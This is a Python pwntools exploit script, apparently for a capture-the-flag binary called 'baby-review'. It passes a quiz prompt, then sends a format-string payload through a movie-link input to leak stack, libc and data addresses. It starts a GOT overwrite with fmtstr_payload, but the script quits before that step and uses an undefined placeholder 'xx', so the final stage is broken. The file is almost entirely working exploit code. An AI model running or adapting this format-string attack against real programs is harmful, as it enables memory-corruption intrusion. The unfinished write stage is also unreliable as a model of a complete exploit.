#!/usr/bin/env python3
from pwn import *
elf = ELF("./given/baby-review")

capital_map = {
        "Ping": "Pong"
        }

def conn():
    p = process([elf.path])
    return p

def answer_capital(p):
    p.recvuntil(b"What is the capital of ")
    s = p.recvline()
    country = s[:s.find(b"?")]
    capital = capital_map[country.decode()]
    p.sendline(capital.encode())

def probe_recursive():
    p = conn()
    answer_capital(p)

    p.recvuntil(b"What would you like to do?")
    p.sendline(b"5")

    p.recvuntil(b"Enter your movie link here and I'll add it to the list")
    p.sendline(b"AAAAAAAA" + b"%p"*((300 - 8) // 2))

    p.recvuntil(b"What would you like to do?")
    p.sendline(b"2")

    p.recvuntil(b"Here's a few movies to watch")
    p.recvuntil(b"https://www.youtube.com/watch?v=Icx4xul9LEE\n")
    leak = p.recvline()
    print(leak)
    leak_arr = leak.split(b"0x")
    idx = leak_arr.index(b"4141414141414141")
    print(idx)

def exploit():
    p = conn()
    answer_capital(p)
    leak(p)


def leak(p):
    p.recvuntil(b"What would you like to do?")
    p.sendline(b"5")

    p.recvuntil(b"Enter your movie link here and I'll add it to the list")
    p.sendline(b"AAAAAAAA" + b"%p" * 9)

    p.recvuntil(b"What would you like to do?")
    p.sendline(b"2")

    p.recvuntil(b"Here's a few movies to watch")
    p.recvuntil(b"https://www.youtube.com/watch?v=Icx4xul9LEE\n")
    leak_str = p.recvline()
    leak_arr = leak_str.split(b"0x")
    libc_leak = leak_arr[3]
    data_leak = leak_arr[5].replace(b"(nil)", b"")
    libc_leak_addr = int(libc_leak, 16)
    data_addr = int(data_leak, 16)
    print("leak libc addr:", hex(libc_leak_addr))
    print("leak data addr: ", hex(data_addr))

    quit()
    got_puts = data_addr - 0x55555555a890 + 0x555555558008
    writes = {got_puts: xx}
    payload = fmtstr_payload(10, writes)


if __name__ == "__main__":
    exploit()
